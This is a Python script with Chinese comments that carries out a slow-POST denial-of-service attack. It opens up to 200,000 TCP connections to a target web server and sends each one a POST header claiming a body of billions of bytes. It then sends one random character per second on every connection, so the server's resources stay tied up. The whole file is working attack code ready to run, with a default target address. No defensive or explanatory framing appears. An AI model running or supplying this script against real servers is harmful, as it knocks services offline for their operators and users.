import socket
import string
import threading
import time
import random

MAX_CONN = 200000  # 最大连接数
Host = '192.168.1.2'
Port = 80
Path = ''
buf = ''

socks = []
flag = 1

alphabet = string.ascii_letters + string.digits


def conn_thread():
    global socks, flag
    for i in range(0, MAX_CONN):  # MAX_CONN允许最大连接数
        # AF_INET 表示 IPv4 地址，创建 TCP套接字，必须使用 SOCK_STREAM 作为套接字类型
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if flag == 1:
            try:
                print((Host, Port, Path))
                s.connect((Host, Port))
                s.send(buf.encode())
                print(buf)
                print(f"[+] 成功发送buf!,conn={i}\n")
                socks.append(s)
            except Exception as e:
                print(f"[-] 无法连接服务器或发送错误:{e}\n")
                time.sleep(1)  # 暂停1秒
        else:
            time.sleep(3)
            flag = 1
            return 0


def send_thread():
    global socks, flag
    while True:
        if flag == 1:
            for s in socks:
                try:
                    s.send(random.choice(alphabet).encode())
                except Exception as e:
                    print(f'[-] 发送异常:{e}\n')
                    socks.remove(s)
                    s.close()
            time.sleep(1)
        else:
            time.sleep(3)
            flag = 1
            return 0


def http(host, port, path):
    global buf, Host, Port, Path
    Host = host
    Port = port
    Path = path
    buf = f'''POST {path} HTTP/1.1
Host: {host}:{port}
Content-Length: {random.randint(2000000000, 3999999999)}
Cookie: SESSION={''.join(random.choice(alphabet) for _ in range(36))}

'''

    # 建立多线程
    conn_th = threading.Thread(target=conn_thread, args=())
    send_th = threading.Thread(target=send_thread, args=())
    # 开启线程
    conn_th.start()
    send_th.start()
